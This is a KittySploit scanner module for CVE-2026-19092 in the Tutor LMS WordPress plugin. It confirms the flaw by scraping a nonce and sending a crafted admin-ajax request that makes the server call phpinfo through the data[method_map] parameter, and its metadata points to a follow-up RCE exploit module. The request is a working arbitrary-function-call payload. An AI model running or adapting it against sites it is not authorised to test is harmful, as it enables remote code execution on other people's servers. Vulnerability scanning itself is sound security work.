#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tutor LMS < 4.0.6 arbitrary PHP function call (CVE-2026-19092)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "tutor"
_VULN_HIGH = (4, 0, 5)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Tutor LMS CVE-2026-19092 RCE detect",
        "description": (
            "Detects CVE-2026-19092: tutor_course_filter_ajax template injection allows "
            "calling phpinfo via data[method_map]."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-19092",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-19092"],
        "modules": ["exploits/multi/http/tutor_lms_cve_2026_19092_rce"],
        "tags": ["web", "scanner", "wordpress", "tutor-lms", "rce", "cve-2026-19092"],
        "agent": {
            "chain": {"suggested_followups": ["exploits/multi/http/tutor_lms_cve_2026_19092_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    _NONCE = re.compile(r'"_tutor_nonce":"([a-z0-9]+)"')

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "_tutor_nonce" not in (home.text or ""):
            return False
        m = self._NONCE.search(home.text or "")
        if not m:
            return False
        ctx = secrets.token_hex(4)
        data = {
            "action": "tutor_course_filter_ajax",
            "_tutor_nonce": m.group(1),
            "template": "single-content-loader",
            f"data[context]": ctx,
            f"data[method_map][{ctx}]": "phpinfo",
        }
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        if "PHP Version" in body and '"success":true' in body.replace(" ", ""):
            self.set_info(
                severity="critical",
                reason="Tutor LMS CVE-2026-19092 — phpinfo via method_map",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-19092",
            )
            return True
        return False
